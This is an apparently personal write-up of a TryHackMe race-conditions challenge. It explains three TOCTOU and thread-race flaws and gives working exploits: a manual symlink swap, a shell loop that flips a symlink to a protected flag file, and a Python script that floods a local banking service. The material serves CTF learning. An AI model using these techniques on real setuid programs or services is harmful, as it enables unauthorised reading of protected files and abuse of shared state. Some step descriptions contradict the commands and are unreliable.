# Race Conditions Challenge TryHackMe WriteUp
### Machine IP = 10.113.180.216

----
Firsly, I accesses the "race" user with give credentials. Since CTF required "walk" user's flag, I decided to look its files. There is a file named "anti_flag_reader.c". Lets look at its content:
```bash
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp) {

    int n;
    char buf[1024];
    struct stat lstat_buf;

    if (argc != 2) {
        puts("Usage: anti_flag_reader <FILE>");
        return 1;
    }
    
    puts("Checking if 'flag' is in the provided file path...");
    int path_check = strstr(argv[1], "flag");
    puts("Checking if the file is a symlink...");
    lstat(argv[1], &lstat_buf);
    int symlink_check = (S_ISLNK(lstat_buf.st_mode));
    puts("<Press Enter to continue>");
    getchar();
    
    if (path_check || symlink_check) {
        puts("Nice try, but I refuse to give you the flag!");
        return 1;
    } else {
        puts("This file can't possibly be the flag. I'll print it out for you:\n");
        int fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    }
    
    return 0;
}
```
### Walk's flag
The Vulnerability: TOCTOU (Time-of-Check to Time-of-Use)

This code is vulnerable to a classic Race Condition known as TOCTOU. The security flaw exists because the program performs a safety check at one moment but uses the file at a later moment, assuming nothing has changed in between.
Weak Points in the Code:

    The Gap Between "Check" and "Use":
    The program uses lstat to check if the file is a symlink and strstr to ensure the path doesn't contain "flag". However, the getchar() function right after these checks forces the program to pause. This gives us a massive window of time to swap the file behind the scenes.

    Static Path Reference:
    The program calls open(argv[1], 0) using the original path string. It assumes that the object at that path is the same one it just verified, but our script changes what that path points to before the open command is executed.

How to make this?
1. I create an empty "test" file on /home/race folder. 
```bash
touch /home/race/test
```
2. Then I run the script of walk user to read the content of this empty file.
```bash
./anti_flag_reader /home/race/test
```
3. It wait for us to enter space but in this time range, I go to second terminal, remove this test file and create a symbolic link /home/race/test2 between two targets:
-- Target A: The harmless /home/race/test (to pass the check).
-- Target B: The protected /home/run/flag (to be read by the program).
```bash
ln -s /home/walk/flag /home/race/test
```
4. The last thing is go to first terminal and click enter button. Bingoo!! We got the flag.

----
### Run's flag
Explaining the TOCTOU Attack on "cat2"

The cat2 program tries to be more secure than the standard cat command by checking the user's permissions using the access() function. However, it contains a critical Race Condition vulnerability.
Why Our Exploit Works:

    The Vulnerable Gap:
    In the check_security_contex function, the program calls access() to check permissions and then calls usleep(500). This 500-microsecond delay is exactly what our script needs. It creates a window of time between the security check and the moment the file is actually opened.

    The "Double Face" of the Path:
    The program uses the path /home/race/test2 twice: first to check access and second to open the file. Because it refers to the file by its path (string) rather than a fixed file descriptor, we can change what that path points to mid-execution.

The Attack Steps (Using Our Files):

    Preparation:
    We create /home/race/dummy, a file that we have full permission to read. This ensures that the access() function returns 0 (Success).

    The Constant Race:
    Our script runs in the background, rapidly flipping the /home/race/test2 symlink between the "safe" dummy and the "forbidden" /home/run/flag.

    The Check (Time A):
    The program calls check_security_contex("/home/race/test2"). If the symlink is pointing to dummy at that exact microsecond, the check passes.

    The 500μs Window:
    The program hits usleep(500). During this tiny sleep, our script continues to loop and eventually switches the /home/race/test2 symlink to point to /home/run/flag.

    The Use (Time B):
    The program wakes up and calls open("/home/race/test2", 0). It thinks it's opening the safe dummy file it just checked, but it actually opens the protected flag and prints it for us.

The code is:
```bash
touch /home/race/dummy;

while true; do 
    ln -sf /home/race/dummy /home/race/test2; 
    ln -sf /home/run/flag /home/race/test2; 
done
```
In target terminal, 
```bash
./cat2 /home/race/test2
```
I got the second flag.

----
### Sprint's flag
The vulnerability in this C code occurs because the variable money is a global shared variable, and the program handles multiple connections using threads without any synchronization (like Mutex or Locks).
Why Our Payload Works:

    Global Variable Vulnerability:
    In the C code, int money is defined outside the functions. This means every single connection (thread) is reading from and writing to the exact same memory location.

    The Flaw in Logic:
    At the end of each thread, the program does this:
    C

    usleep(1);
    money = 0;

    The developer intended to reset the balance for each user. However, because money is global, if Thread A is "sleeping" for that 1 microsecond, Thread B can come in and add more money to the same total.

    The Power of Parallelism:
    Our Python script opens 10 different deposit threads. Each thread sends multiple "deposit" commands as fast as possible. This causes a "pile-up" of money in the global variable before the server has a chance to execute the money = 0 line.

The Attack Steps (The "Money Pile-up"):

    Step 1: The Inflation: Our script floods the server with "deposit" requests. Because 10 threads are working at once, the global money variable quickly jumps from 0 to 10,000, 20,000, 30,000 and so on.

    Step 2: The Race Window: While the server's threads are busy processing deposits and hitting that usleep(1) delay, the global balance stays above the required 15,000 for a split second.

    Step 3: The Capture: Our purchase_flag thread is constantly checking the balance. If it sends the "purchase flag" command at the exact microsecond where the global money is high, the server passes the check:
    if (money >= 15000)

    Step 4: Victory: The server sends the flag, and our script detects the "THM" string and stops the attack.

My script:
```bash
import socket
import threading

# Server details
target = ('localhost', 1337)

def deposit():
    while True:
        try:
            s = socket.socket()
            s.connect(target)
            # Sending multiple deposits in one connection is more effective for race conditions
            s.sendall(b"deposit\ndeposit\ndeposit\n")
            s.close()
        except: 
            pass

def purchase_flag():
    while True:
        try:
            s = socket.socket()
            s.connect(target)
            s.sendall(b"purchase flag\n")
            response = s.recv(1024).decode(errors='ignore')
            s.close()

            if 'THM' in response:
                print("\n" + "="*30)
                print("FLAG FOUND: " + response.strip())
                print("="*30)
                import os; os._exit(0) # Stop everything immediately once found
        except: 
            pass

# Opening multiple deposit threads to increase parallelism
for _ in range(10): 
    threading.Thread(target=deposit).start()

# Start the flag hunter
threading.Thread(target=purchase_flag).start()
```
Yeah we got the last flag in this way.




















  
